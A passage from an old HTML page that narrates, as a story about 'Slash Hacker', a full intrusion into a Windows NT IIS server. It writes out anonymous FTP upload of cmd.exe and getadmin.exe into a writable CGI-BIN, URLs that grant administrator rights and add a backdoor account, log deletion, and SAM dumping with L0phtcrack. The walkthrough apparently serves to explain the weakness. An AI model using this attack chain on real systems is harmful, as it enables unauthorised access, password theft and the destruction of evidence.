    face="Verdana" color="#FFFFFF">Slash Hacker has a Windows NT Server at home. Why? Because
    he knows if he's going to hack NT he's best using the same type of computer...it gives him
    all the necessary tools. He has installed RAS and has a dial-up connection to the
    Internet. One morning, around 2:30am he dials into the Internet...his IP address is
    dynamically assigned to him. He opens up a Command Prompt window and gets down to work. He
    knows </font><font face="Verdana">www.ukrin.com</font><font face="Verdana" color="#FFFFFF">'s
    web server is running IIS. How? Because he once did a search on &quot;batch files as
    CGI&quot; using Excites search engine. That phrase is in Chapter 8 of Internet Information
    Server's on-line help....and unfortunately it's been indexed by Excite's spider...now
    slash has a list of around 600 web servers running IIS.</font></small><p><small><font
    face="Verdana" color="#FFFFFF">He ftps to </font><font face="Verdana">www.ukrin.com</font><font
    face="Verdana" color="#FFFFFF">. He isn't even sure yet if the server is running the ftp
    service. He knows if he gets a connection refused message it wont be...he's in luck
    though...the following appears on the screen :</font></small></p>
    <p><small><font face="Verdana" color="#FFFFFF">C:\ftp www.</font><font face="Verdana">ukrin.com</font></small></p>
    <p><small><font face="Verdana" color="#FFFFFF">Connected to www.</font><font
    face="Verdana">ukrin.com</font><font face="Verdana" color="#FFFFFF">.</font></small></p>
    <p><font face="Verdana" color="#FFFFFF"><small>220 webby Microsoft FTP Service (Version
    3.0).</small></font></p>
    <p><small><font face="Verdana" color="#FFFFFF">User (www.</font><font face="Verdana">ukrin.com</font><font
    face="Verdana" color="#FFFFFF">:(none)):</font></small></p>
    <p><font face="Verdana" color="#FFFFFF"><small>This connection message tells him something
    extremely important : The NetBIOS name of the server : WEBBY. From this he can deduce the
    name of the anonymous internet account that is used by NT to allow people to anonymously
    use the WWW, FTP and Gopher services on the machine. If the default account hasn't been
    changed, and he knows that it is very rare if it has been changed, the anonymous internet
    account will be called IUSR_WEBBY. This information will be needed later if he's to gain
    Administrator access to the machine. He enters &quot;anonymous&quot; as the user and the
    following appears :</small></font></p>
    <p><font face="Verdana" color="#FFFFFF"><small>331 Anonymous access allowed, send identity
    (e-mail name) as password.</small></font></p>
    <p><font face="Verdana" color="#FFFFFF"><small>Password:</small></font></p>
    <p><font face="Verdana" color="#FFFFFF"><small><small>&nbsp;</small>slash often tries the
    &quot;guest&quot; account before using &quot;anonymous&quot; as the user. A fresh install
    of NT has the &quot;guest&quot; account disabled but some admins enable this account....
    and the funny thing is they usually put a weak password on it such as 'guest' or no
    password at all. If he manages to gain access to the ftp service with this account he has
    a valid NT user account....everything that the &quot;guest&quot; account has access
    to...so does slash, and sometimes that can be almost everything. He knows he can access
    their site now...but there is still a long way to go yet....even at this point he still
    might not get access. At this point he doesn't even supply a password...he just presses
    enter and gets a message stating that the Anonymous user is logged in. First off he types
    &quot;cd /c&quot; because some admins will make the root of the drive a virtual ftp
    directory and leave the default alias name : &quot;/c&quot;. Next he sees whether he can
    actually &quot;put&quot; any files onto the site ie. is the write permission enabled for
    this ftp site. He's in luck. Next he types &quot;dir&quot; to see what he has access to.
    He chuckles to himself when he sees a directory called &quot;CGI-BIN&quot;. Obviously the
    Webmaster of the NT machine has put this here with the rest of the WWW site so he can
    remotely make changes to it. slash knows that the CGI-BIN has the &quot;Execute&quot;
    permission so if he can manage to put any program in here he can run it from his web
    browser. He hopes that the Webmaster hasn't, using NTFS file-level security, cut off write
    access to the anonymous internet account to this directory...even though he knows there
    are sometimes ways round this. He changes to the CGI-BIN directory and then changes the
    type to I by using the command &quot;binary&quot;. Then he types &quot;put cmd.exe&quot;.
    He's in luck..he gets the following response :</small></font></p>
    <p><font face="Verdana" color="#FFFFFF"><small>200 PORT command successful.</small></font></p>
    <p><font face="Verdana" color="#FFFFFF"><small>150 Opening BINARY mode data connection for
    CMD.EXE.</small></font></p>
    <p><font face="Verdana" color="#FFFFFF"><small>226 Transfer complete.</small></font></p>
    <p><font face="Verdana" color="#FFFFFF"><small>208144 bytes sent in 0.06 seconds (3469.07
    Kbytes/sec)</small></font></p>
    <p><font face="Verdana" color="#FFFFFF"><small>Next he puts getadmin.exe and gasys.dll
    into the same directory. With these three files in place he doesn't even gracefully
    &quot;close&quot; the ftp session; he just closes the Command Prompt window. With a smile
    on his face he leans back and lights a smoke, savouring the moment...he knows he has
    them.... After crunching the cigarette out in an overflowing ashtray he connects to his
    second ISP. He does this because if logging is enabled on the NT machine the IP address of
    ISP's proxy server will be left and not his own...not that it really matters because soon
    he'll edit the logfile and wipe all traces of his presence. Opening up the web browser he
    enters the following URL :</small></font></p>
    <p><small><font face="Verdana" color="#FFFFFF">http://www.</font><font face="Verdana">ukrin.com</font><font
    face="Verdana" color="#FFFFFF">/cgi-bin/getadmin.exe?IUSR_WEBBY</font></small></p>
    <p><font face="Verdana" color="#FFFFFF"><small>After about a fifteen second wait the
    following appears on his web browser:</small></font></p>
    <p><font face="Verdana" color="#FFFFFF"><small>CGI Error</small></font></p>
    <p><font face="Verdana" color="#FFFFFF"><small>The specified CGI application misbehaved by
    not returning a complete set of HTTP headers. The headers it did return are:</small></font></p>
    <p><font face="Verdana" color="#FFFFFF"><small>Congratulations , now account IUSR_WEBBY
    have administrator rights!</small></font></p>
    <p><font face="Verdana" color="#FFFFFF"><small>He has just made the anonymous internet
    account a local administrator and consequently using this account he can do pretty much
    what he wants to. Firstly though, he has to create an account for himself that he can use
    to connect to the NT server using NT Explorer and most of the Administrative tools. He
    can't use the IUSR_SATURN account because he doesn't know the randomly generated password.
    To create an account he enters the following URL:</small></font></p>
    <p><small><font face="Verdana" color="#FFFFFF">http://www.</font><font face="Verdana">ukrin.com</font><font
    face="Verdana" color="#FFFFFF">/cgi-bin/cmd.exe?/c%20c:\winnt\system32\net.exe%20user%20xxx%20hacked%20/add</font></small></p>
    <p><font face="Verdana" color="#FFFFFF"><small>He has just created an account called
    &quot;xxx&quot; with the password &quot;hacked&quot;. To make the account a local
    administrator he enters the following URL:</small></font></p>
    <p><small><font face="Verdana" color="#FFFFFF">http://www</font><font face="Verdana">.ukrin.com</font><font
    face="Verdana" color="#FFFFFF">/cgi-bin/getadmin.exe?xxx</font></small></p>
    <p><small><font face="Verdana" color="#FFFFFF">It has taken him less than ten minutes to
    do all of this. He disconnects from his ISP and clicks on start, goes upto find and does a
    search for the computer </font><font face="Verdana">www.ukrin.com</font><font
    face="Verdana" color="#FFFFFF">. After about a minute the computer is found :</font></small></p>
    <p><small><font face="Verdana" color="#FFFFFF">Next he right clicks on the
    &quot;computer&quot; and then clicks on Explore. NT Explorer opens and after a little wait
    Alex is prompted for a user-name and password. He enters &quot;xxx&quot; and
    &quot;hacked&quot;. Moments later he is connected. Admin rights for the computer </font><font
    face="Verdana">www.ukrin.com<font color="#FFFFFF"> </font></font><font face="Verdana"
    color="#FFFFFF">are appended to his own security access token...now he can do anything.
    Using User Manager for Domains he can retrieve all the account information; he can connect
    to the Internet Service Manager; he can view Server Manager...first though, using NT
    Explorer he maps a drive to the hidden system share C$. He changes to the
    Winnt\system32\logfiles directory and opens up the logfile for that day. He deletes all of
    the log entries pertaining to his &quot;visit&quot; and saves it. If he gets any message
    about sharing violations all he has to do is change the date on the computer with the
    following URL:</font></small></p>
    <p><small><font face="Verdana" color="#FFFFFF">http://www.</font><font face="Verdana">ukrin.com</font><font
    face="Verdana" color="#FFFFFF">/cgi-bin/cmd.exe?/c%20date%2002/02/98</font></small></p>
    <p><font face="Verdana" color="#FFFFFF"><small>Next, using the Registry Editor he connects
    to the registry on the remote computer. Then using L0phtcrack he dumps the SAM (the
    Security Accounts Manager - holds account info) on the NT server and begins cracking all
    the passwords on the machine. Using the Task Manager he sets the priority to Low because
    L0phtcrack is fairly processor intensive (NB L0phtcrack ver 2.0 sets the priority to Low
    anyway) and there is still a few thing he must do to hide the fact that that some-one has
    gained entry. He deletes cmd.exe, getadmin.exe and gasys.dll from the cgi-bin, then he
    checks the security event log for the remote NT server using Event Viewer to see if he's
    left any traces there. Finally using User Manager for Domains he removes admin rights from
    the IUSR_WEBBY account and deletes the xxx account he created a few moments earlier. He
    doesn't need this account anymore....L0phtcrack will be able to brute force all the
    accounts. Next time he connects to this machine it will be using the Administrator
    account. He breaks his connection to the Internet and sets 10phtcrack's priority to High,
    leaves it running and heads to bed...Looking at his alarm clock : it's just passed
    3:10am....Sighing to himself, he mumbles, &quot;Sheesh, I'm getting slow!&quot; and falls
    asleep with a grin on his face.</small></font></p>
